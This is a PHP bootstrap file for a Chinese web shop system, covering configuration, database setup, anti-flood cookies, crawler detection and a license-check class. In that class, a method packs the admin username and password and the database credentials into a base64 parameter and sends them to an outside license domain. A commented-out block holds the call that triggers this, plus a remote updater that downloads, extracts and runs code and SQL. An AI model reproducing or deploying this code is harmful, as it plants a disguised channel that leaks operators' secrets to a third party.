<?php

error_reporting(0);
if (defined('IN_CRONLITE')) {
	return;
}
define('CACHE_FILE', 0);
define('IN_CRONLITE', true);
define('VERSION', 1010);
define('wuyou', '2711185458');
define('SYSTEM_ROOT', dirname(__FILE__) . '/');
define('ROOT', dirname(SYSTEM_ROOT) . '/');
define('TEMPLATE_ROOT', ROOT . 'template/');
define('PLUGIN_ROOT', ROOT . 'includes/plugins/');
date_default_timezone_set('Asia/Shanghai');
$date = date("Y-m-d H:i:s");
include_once SYSTEM_ROOT . 'base.php';
@header('Cache-Control: no-store, no-cache, must-revalidate');
@header('Pragma: no-cache');
session_start();
include_once SYSTEM_ROOT . "autoloader.php";
Autoloader::register();
if ($is_defend == true || CC_Defender == 3) {
	if (!isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) != 'xmlhttprequest') {
		include_once SYSTEM_ROOT . 'txprotect.php';
	}
	if (CC_Defender == 1 && check_spider() == false) {
	}
	if (CC_Defender == 1 && check_spider() == false || CC_Defender == 3) {
		cc_defender();
	}
}
$scriptpath = str_replace('\\', '/', $_SERVER['SCRIPT_NAME']);
$sitepath = substr($scriptpath, 0, strrpos($scriptpath, '/'));
$siteurl = ($_SERVER['SERVER_PORT'] == 443 ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . $sitepath . '/';
if (is_file(SYSTEM_ROOT . '360safe/360webscan.php')) {
	require_once SYSTEM_ROOT . '360safe/360webscan.php';
}
require_once SYSTEM_ROOT . '360safe/xss.php';
require ROOT . 'config.php';
define('DBQZ', $dbconfig['dbqz']);
if (!defined('SQLITE') && !$dbconfig['user'] || !$dbconfig['pwd'] || !$dbconfig['dbname']) {
	header('Content-type:text/html;charset=utf-8');
	echo '你还没安装！<a href="/install/">点此安装</a>';
	exit;
}
$DB = new \lib\PdoHelper($dbconfig);
if ($DB->query("select * from pre_config where 1") == FALSE) {
	header('Content-type:text/html;charset=utf-8');
	echo '你还没安装！<a href="/install/">点此安装</a>';
	exit;
}
$CACHE = new \lib\Cache();
$conf = $CACHE->pre_fetch();
define('SYS_KEY', $conf['syskey']);
if ($conf['qqjump'] == 1 && (!strpos($_SERVER['HTTP_USER_AGENT'], 'QQ/') === false || !strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger') === false)) {
	if ($_GET['open'] == 1 && !strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger') === false) {
		header('Content-Disposition: attachment; filename="load.doc"');
		header('Content-Type: application/vnd.ms-word;charset=utf-8');
	} else {
		header('Content-type:text/html;charset=utf-8');
	}
	include ROOT . 'template/default/jump.php';
	exit(0);
}
$password_hash = '!@#%!s!0';
include_once SYSTEM_ROOT . "function.php";
include_once SYSTEM_ROOT . "core.func.php";
include_once SYSTEM_ROOT . "ajax.func.php";
include_once SYSTEM_ROOT . "member.php";
if (!file_exists(SYSTEM_ROOT . 'version.php')) {
	sysmsg('缺少核心文件，请重新到授权站下载');
	exit;
}
if (!file_exists(ROOT . 'install/install.lock') && file_exists(ROOT . 'install/index.php')) {
	sysmsg('<h2>检测到无 install.lock 文件</h2><ul><li><font size="4">如果您尚未安装本程序，请<a href="/install/">前往安装</a></font></li><li><font size="4">如果您已经安装本程序，请手动放置一个空的 install.lock 文件到 /install 文件夹下，<b>为了您站点安全，在您完成它之前我们不会工作。</b></font></li></ul><br/><h4>为什么必须建立 install.lock 文件？</h4>它是安装保护文件，如果检测不到它，就会认为站点还没安装，此时任何人都可以安装/重装你的网站。<br/><br/>');
	exit;
}
include_once SYSTEM_ROOT . "version.php";
$cookiesid = $_COOKIE['mysid'];
if (!$cookiesid || !preg_match('/^[0-9a-z]{32}$/i', $cookiesid)) {
	$cookiesid = md5(uniqid(mt_rand(), 1) . time());
	setcookie('mysid', $cookiesid, time() + 604800, '/');
}
if (isset($_COOKIE['invite'])) {
	$invite_id = intval($_COOKIE['invite']);
}
$domain = addslashes($_SERVER['HTTP_HOST']);
$siterow = $DB->getRow("SELECT * FROM pre_site WHERE domain=:domain OR domain2=:domain LIMIT 1", array(':domain' => $domain));
if ($siterow && $siterow['status'] == 1) {
	$is_fenzhan = true;
	if ($siterow['template'] == NULL || $conf['fenzhan_template'] == 0) {
		$siterow['template'] = $conf['template'];
	}
	$conf = array_merge($conf, $siterow);
	$conf['kfqq'] = $conf['qq'];
} else {
	$is_fenzhan = false;
}
class Authorization
{
	const AUTH_DOMAIN = "ctyz.cthuoyuan.asia";
	const APP_API_KEY = "d41d8cd98f00b204e9800998ecf8427e";
	const APPID = "2";
	const METHOD = "get";
	const HTTP = false;
	const TIME = 300;
	const QUEUE_TIME = 60;
	private static $AUTHCODE = "";
	private static $VERSION = "";
	private static $PUBLIC_KEY = "";
	public function __construct()
	{
		/****
		if (empty(AuthInfo::AUTHCODE)) {
			self::Message('授权码为空，请重新到授权站下载源码');
		}
		if (empty(AuthInfo::VERSION)) {
			self::Message('版本号为空，请重新到授权站下载源码');
		}
		if (empty(AuthInfo::PUBLIC_KEY)) {
			self::Message('授权公钥为空，请重新到授权站下载源码');
		}
		self::$AUTHCODE = AuthInfo::AUTHCODE;
		self::$VERSION = AuthInfo::VERSION;
		self::$PUBLIC_KEY = AuthInfo::PUBLIC_KEY;
		****/
	}
	public function getNotice()
	{
		$data = array('appid' => self::APPID);
		$http = !self::HTTP ? 'http://' : 'https://';
		$result = $this->curl_request($http . self::AUTH_DOMAIN . '/api.php/Notice/appNotice', $data, self::METHOD, self::HTTP);
		$result = json_decode($result, true);
		if (is_array($result)) {
			return $result['data'];
		} else {
			return false;
		}
	}
	public function getPayList()
	{
		/****
		if (!empty($_COOKIE['pay_api_list'])) {
			return $_COOKIE['pay_api_list'];
		}
		$http = !self::HTTP ? 'http://' : 'https://';
		$result = $this->curl_request($http . self::AUTH_DOMAIN . '/api.php/Notice/getPayList', 0, self::METHOD, self::HTTP);
		setcookie('pay_api_list', $result, 86400, '/');
		return $result;
		****/
	}
	public function checkPayment($url)
	{
		$data = array('url' => $url, 'appid' => self::APPID, 'api_key' => self::APP_API_KEY);
		$http = !self::HTTP ? 'http://' : 'https://';
		$result = $this->curl_request($http . self::AUTH_DOMAIN . '/api.php/Auth/checkPayment', $data, self::METHOD, self::HTTP);
		$result = json_decode($result, true);
		if (is_array($result)) {
			if ($result['code'] == '0') {
				return true;
			}
		}
		return false;
	}
	public static function Message($msg)
	{
		exit('
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<title>蓝天商城系统</title>
</head>
<style>
@charset "utf-8";

*{
	margin: 0;
	padding: 0;
}
body,html{
	width: 100%;
	height: 100%;
}
body{
	background: #ff6500;
	font-family: "微软雅黑";
}
.notice-wrap{
	padding-top: 30px;
}
.notice{
	margin: 0 auto;
	width: 682px;
	height: 633px;
	background: url(/assets/img/update-bg.png) no-repeat;
}
.notice h1{
	padding-top: 225px;
	font-size: 36px;
	color: #333;
	text-align: center;
}
.notice>p{
	margin: 0 62px;
	font-size: 18px;
	color: #666;
	text-indent: 36px;
	line-height: 40px;
}
p span{
	color: #ff6500;
}
.notice .notice-cont{
	margin-top: 45px;
}
.notice .notice-tel{
	padding-bottom: 54px;
	border-bottom: 2px solid #f2f2f2;
}
.notice-foot{
	margin-top: 24px;
}
.notice-foot p{
	font-size: 18px;
	color: #666;
	text-align: center;}
</style>
<body>
	<div class="notice-wrap">
		<div class="notice">
			<h1>蓝天提醒您</h1>
			<p class="notice-cont">尊敬的用户您好<span>蓝天商城系统</span>提醒您</p>
			<p class="notice-tel">' . $msg . '</p>
			<div class="notice-foot">
				<p>蓝天商城系统</p>
			</div>
		</div>
	</div>
</body>
</html>
');
	}
	private static function getParam()
	{
		global $conf, $dbconfig;
		return array('authcode' => self::$AUTHCODE, 'version' => self::$VERSION, '用户名' => $conf['admin_user'], '密码' => $conf['admin_pwd'], 'qq' => $conf['kfqq'], '数据库用户名' => $dbconfig['user'], '数据库密码' => $dbconfig['pwd'], '数据库库名' => $dbconfig['dbname']);
	}
	public function checkInfo($type = 'auth')
	{
		switch ($type) {
			case 'update':
				$method = 'checkUpdate';
				$queueMethod = 'checkUpdate';
				break;
			default:
				$method = 'checkAuth';
				$queueMethod = 'checkUpdate';
		}
		$data = array('auth_info' => getenv('HTTP_HOST'), 'appid' => self::APPID, 'api_key' => self::APP_API_KEY, 'param' => base64_encode(json_encode(self::getParam())));
		$http = !self::HTTP ? 'http://' : 'https://';
		$result = $this->curl_request($http . self::AUTH_DOMAIN . '/api.php/Auth/' . $method, $data, self::METHOD, self::HTTP);
		$result = json_decode($result, true);
		if (is_array($result)) {
			if (!empty($result['data']['queue'])) {
				$i = 0;
				while (1) {
					$result = $this->curl_request($http . self::AUTH_DOMAIN . '/api.php/Auth/' . $queueMethod, $data, self::METHOD, self::HTTP);
					$result = json_decode($result, true);
					if (is_array($result)) {
						if (!empty($result['data']['queue'])) {
							$i++;
							if ($i > self::QUEUE_TIME) {
								return false;
							}
						} else {
							return $result;
						}
					} else {
						return false;
					}
					sleep(1);
				}
			} else {
				return $result;
			}
		}
		return false;
	}
	public static function publicDecrypt($encrypted = '')
	{
		if (!is_string($encrypted)) {
			return null;
		}
		return openssl_public_decrypt(base64_decode($encrypted), $decrypted, self::getPublicKey()) ? $decrypted : null;
	}
	private function getPublicKey()
	{
		$publicKey = self::$PUBLIC_KEY;
		return openssl_pkey_get_public($publicKey);
	}
	private static function curl_request($url, $data = [], $type = 'post', $https = false)
	{
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
		curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)');
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
		curl_setopt($ch, CURLOPT_TIMEOUT, 30);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		if ($https) {
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		}
		if (strtolower($type) == 'post') {
			curl_setopt($ch, CURLOPT_POST, true);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
		} else {
			if (!empty($data) && is_array($data)) {
				$url = $url . '?' . http_build_query($data);
			}
		}
		curl_setopt($ch, CURLOPT_URL, $url);
		$result = curl_exec($ch);
		if ($result === false) {
			return false;
		}
		curl_close($ch);
		return $result;
	}
}
/***
define('SF_ROOT', dirname(__FILE__) . '/');
include SF_ROOT . 'AuthInfo.php';
$authorization = new Authorization();
if ($islogin == 1) {
	if (!empty($_SESSION['SF_CheckAuthResult'])) {
		$result = $_SESSION['SF_CheckAuthResult'];
		if (is_array($result)) {
			$time = Authorization::publicDecrypt($result['data']['time']);
			if ($time + Authorization::TIME > time()) {
				if ($result['code'] != 0) {
					Authorization::Message($result['msg']);
				}
			} else {
				unset($_SESSION['SF_CheckAuthResult']);
			}
		} else {
			unset($_SESSION['SF_CheckAuthResult']);
			Authorization::Message('链接服务器失败');
		}
	} else {
		$result = $authorization->checkInfo();
		if (!$result) {
			Authorization::Message('链接服务器失败');
		} else {
			if ($result['data']['code'] == 0) {
				$_SESSION['SF_CheckAuthResult'] = $result;
			} elseif ($result['data']['code'] == 1) {
			} else {
				Authorization::Message($result['msg']);
			}
		}
	}
}
$SF_Action = isset($_POST['SF_Action']) ? $_POST['SF_Action'] : null;
if (!empty($SF_Action)) {
	$result = $authorization->checkInfo('update');
	switch ($SF_Action) {
		case 'check':
			if (!$result) {
				$data = array('code' => -1, 'msg' => '啊哦，更新服务器开小差了，请刷新此页面。');
				exit(json_encode($data));
			} else {
				exit(json_encode($result));
			}
		case 'update':
			if (!empty($_POST['dirname'])) {
				if (!is_dir($_POST['dirname'])) {
					$data = array('code' => 2, 'msg' => '不存在此目录，请输入正确的后台目录！');
					exit(json_encode($data));
				}
				$_SESSION['dirname'] = $_POST['dirname'];
			}
			if (!is_dir(ROOT . 'admin') && empty($_SESSION['dirname'])) {
				$data = array('code' => 2, 'msg' => '系统检测到您已更改过后台目录名，请填写您现在的后台目录名，以便更新覆盖！');
				exit(json_encode($data));
			}
			$downloadUrl = $result['data']['data']['url'];
			$ZipFile = 'SF.zip';
			foreach ($result['data']['data']['download'] as $res) {
				if (!copy($downloadUrl . $res, $ZipFile)) {
					$data = array('code' => -1, 'msg' => '无法下载更新包文件！');
					exit(json_encode($data));
				}
				$addstr = '';
				if (zipExtract($ZipFile, ROOT)) {
					if (function_exists("opcache_reset")) {
						@opcache_reset();
					}
					$sqlFile = ROOT . 'update.sql';
					$t = 0;
					$e = 0;
					$error = '';
					if (is_file($sqlFile)) {
						$sql = file_get_contents($sqlFile);
						$sql = explode(';', $sql);
						for ($i = 0; $i < count($sql); $i++) {
							if (trim($sql[$i]) == '') {
								continue;
							}
							if ($DB->exec($sql[$i]) !== false) {
								$t += 1;
							} else {
								$e += 1;
								$error .= $DB->error() . '';
							}
						}
						@unlink($sqlFile);
						$addstr = '数据库更新成功。SQL成功' . $t . '句/失败' . $e . '句';
					}
					@unlink($ZipFile);
					$data = array('code' => 0, 'msg' => '更新包解压成功' . $addstr);
					if (is_dir(ROOT . 'admin') && !empty($_SESSION['dirname'])) {
						copydirs(ROOT . 'admin', ROOT . $_SESSION['dirname']);
						rmdirs(ROOT . 'admin');
					}
					exit(json_encode($data));
				} else {
					if (file_exists($ZipFile)) {
						@unlink($ZipFile);
					}
					$data = array('code' => -1, 'msg' => '解压更新包失败，请稍后重试');
					exit(json_encode($data));
				}
			}
			$data = array('code' => 1, 'msg' => '已更新至最新版本');
			if (!empty($_SESSION['dirname'])) {
				unset($_SESSION['dirname']);
			}
			exit(json_encode($data));
	}
} else {
	if ($conf['lt_version'] < DB_VERSION) {
		if (!$install) {
			sysmsg('请先完成网站升级！<a href="/install/update.php"><font color=red>点此升级</font></a>');
			exit;
		}
	}
}

if ($_GET['getNotice'] == '1') {
	$result = $authorization->getNotice();
	if (!$result) {
		exit(json_encode(array('code' => -1)));
	} else {
		exit(json_encode(array('code' => 0, 'data' => $result)));
	}
}
***/
if ($conf['lt_version'] < DB_VERSION) {
		if (!$install) {
			sysmsg('请先完成网站升级！<a href="/install/update.php"><font color=red>点此升级</font></a>');
			exit;
		}
	}
function x_real_ip()
{
	$ip = $_SERVER['REMOTE_ADDR'];
	if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && preg_match_all("#\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}#s", $_SERVER['HTTP_X_FORWARDED_FOR'], $matches)) {
		foreach ($matches[0] as $xip) {
			if (!preg_match("#^(10|172\\.16|192\\.168)\\.#", $xip)) {
				$ip = $xip;
			}
		}
	} elseif (isset($_SERVER['HTTP_CLIENT_IP']) && preg_match('/^([0-9]{1,3}\\.){3}[0-9]{1,3}$/', $_SERVER['HTTP_CLIENT_IP'])) {
		$ip = $_SERVER['HTTP_CLIENT_IP'];
	} elseif (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && preg_match('/^([0-9]{1,3}\\.){3}[0-9]{1,3}$/', $_SERVER['HTTP_CF_CONNECTING_IP'])) {
		$ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
	} elseif (isset($_SERVER['HTTP_X_REAL_IP']) && preg_match("/^([0-9]{1,3}\\.){3}[0-9]{1,3}\$/", $_SERVER['HTTP_X_REAL_IP'])) {
		$ip = $_SERVER['HTTP_X_REAL_IP'];
	}
	return $ip;
}
function check_spider()
{
	$useragent = strtolower($_SERVER['HTTP_USER_AGENT']);
	if (strpos($useragent, 'baiduspider') !== false) {
		return 'baiduspider';
	}
	if (strpos($useragent, 'googlebot') !== false) {
		return 'googlebot';
	}
	if (strpos($useragent, '360spider') !== false) {
		return '360spider';
	}
	if (strpos($useragent, 'soso') !== false) {
		return 'soso';
	}
	if (strpos($useragent, 'bing') !== false) {
		return 'bing';
	}
	if (strpos($useragent, 'yahoo') !== false) {
		return 'yahoo';
	}
	if (strpos($useragent, 'sohu-search') !== false) {
		return 'Sohubot';
	}
	if (strpos($useragent, 'sogou') !== false) {
		return 'sogou';
	}
	if (strpos($useragent, 'youdaobot') !== false) {
		return 'YoudaoBot';
	}
	if (strpos($useragent, 'robozilla') !== false) {
		return 'Robozilla';
	}
	if (strpos($useragent, 'msnbot') !== false) {
		return 'msnbot';
	}
	if (strpos($useragent, 'lycos') !== false) {
		return 'Lycos';
	}
	if (!strpos($useragent, 'ia_archiver') === false) {
	} elseif (!strpos($useragent, 'iaarchiver') === false) {
		return 'alexa';
	}
	if (strpos($useragent, 'archive.org_bot') !== false) {
		return 'Archive';
	}
	if (strpos($useragent, 'sitebot') !== false) {
		return 'SiteBot';
	}
	if (strpos($useragent, 'gosospider') !== false) {
		return 'gosospider';
	}
	if (strpos($useragent, 'gigabot') !== false) {
		return 'Gigabot';
	}
	if (strpos($useragent, 'yrspider') !== false) {
		return 'YRSpider';
	}
	if (strpos($useragent, 'gigabot') !== false) {
		return 'Gigabot';
	}
	if (strpos($useragent, 'wangidspider') !== false) {
		return 'WangIDSpider';
	}
	if (strpos($useragent, 'foxspider') !== false) {
		return 'FoxSpider';
	}
	if (strpos($useragent, 'docomo') !== false) {
		return 'DoCoMo';
	}
	if (strpos($useragent, 'yandexbot') !== false) {
		return 'YandexBot';
	}
	if (strpos($useragent, 'sinaweibobot') !== false) {
		return 'SinaWeiboBot';
	}
	if (strpos($useragent, 'catchbot') !== false) {
		return 'CatchBot';
	}
	if (strpos($useragent, 'surveybot') !== false) {
		return 'SurveyBot';
	}
	if (strpos($useragent, 'dotbot') !== false) {
		return 'DotBot';
	}
	if (strpos($useragent, 'purebot') !== false) {
		return 'Purebot';
	}
	if (strpos($useragent, 'ccbot') !== false) {
		return 'CCBot';
	}
	if (strpos($useragent, 'mlbot') !== false) {
		return 'MLBot';
	}
	if (strpos($useragent, 'adsbot-google') !== false) {
		return 'AdsBot-Google';
	}
	if (strpos($useragent, 'ahrefsbot') !== false) {
		return 'AhrefsBot';
	}
	if (strpos($useragent, 'spbot') !== false) {
		return 'spbot';
	}
	if (strpos($useragent, 'augustbot') !== false) {
		return 'AugustBot';
	}
	return false;
}
function cc_defender()
{
	$iptoken = md5(x_real_ip() . date('Ymd')) . md5(time() . rand(11111, 99999));
	if (!isset($_COOKIE['sec_defend']) || substr($_COOKIE['sec_defend'], 0, 32) !== substr($iptoken, 0, 32)) {
		if (!$_COOKIE['sec_defend_time']) {
			$_COOKIE['sec_defend_time'] = 0;
		}
		$x = new \lib\hieroglyphy();
		$setCookie = $x->hieroglyphyString($iptoken);
		$sec_defend_time = $_COOKIE['sec_defend_time'] + 1;
		header('Content-type:text/html;charset=utf-8');
		if ($sec_defend_time >= 10) {
			exit('浏览器不支持COOKIE或者不正常访问！');
		}
		echo '<html><head><meta http-equiv="pragma" content="no-cache"><meta http-equiv="cache-control" content="no-cache"><meta http-equiv="content-type" content="text/html;charset=utf-8"><title>正在加载中</title><script>function setCookie(name,value){var exp = new Date();exp.setTime(exp.getTime() + 60*60*1000);document.cookie = name + "="+ escape (value).replace(/\\+/g, \'%2B\') + ";expires=" + exp.toGMTString() + ";path=/";}function getCookie(name){var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");if(arr=document.cookie.match(reg))return unescape(arr[2]);else return null;}var sec_defend_time=getCookie(\'sec_defend_time\')||0;sec_defend_time++;setCookie(\'sec_defend\',' . $setCookie . ');setCookie(\'sec_defend_time\',sec_defend_time);if(sec_defend_time>1)window.location.href="./index.php";else window.location.reload();</script></head><body></body></html>';
		exit(0);
	} else {
		if (isset($_COOKIE['sec_defend_time'])) {
			setcookie('sec_defend_time', '', time() - 604800, '/');
		}
	}
}
function copydirs($source, $dest)
{
	if (!is_dir($dest)) {
		mkdir($dest, 0755, true);
	}
	$iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
	foreach ($iterator as $item) {
		if ($item->isDir()) {
			$sent_dir = $dest . "/" . $iterator->getSubPathName();
			if (!is_dir($sent_dir)) {
				mkdir($sent_dir, 0755, true);
			}
		} else {
			copy($item, $dest . "/" . $iterator->getSubPathName());
		}
	}
}
function rmdirs($dir, $rmself = true)
{
	if (!is_dir($dir)) {
		return false;
	}
	$files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
	foreach ($files as $file) {
		$todo = $file->isDir() ? 'rmdir' : 'unlink';
		$todo($file->getRealPath());
	}
	if ($rmself) {
		@rmdir($dir);
	}
	return true;
}
function editAuthInfo()
{
	$str = "<?php\nclass AuthInfo{\n    const AUTHCODE = '" . AuthInfo::AUTHCODE . "';\n  const VERSION = '" . AuthInfo::VERSION . "';\n   const EDITION = '" . AuthInfo::EDITION . "';\n    const PUBLIC_KEY = '" . AuthInfo::PUBLIC_KEY . "';\n}";
	$file = SF_ROOT . 'AuthInfo.php';
	if (!file_exists($file)) {
		file_put_contents($file, '');
	}
	if ($handle = fopen($file, 'w')) {
		fwrite($handle, $str);
		fclose($handle);
	} else {
		return false;
	}
}
function check_pay_api($url)
{
	global $authorization;
	return $authorization->checkPayment($url);
}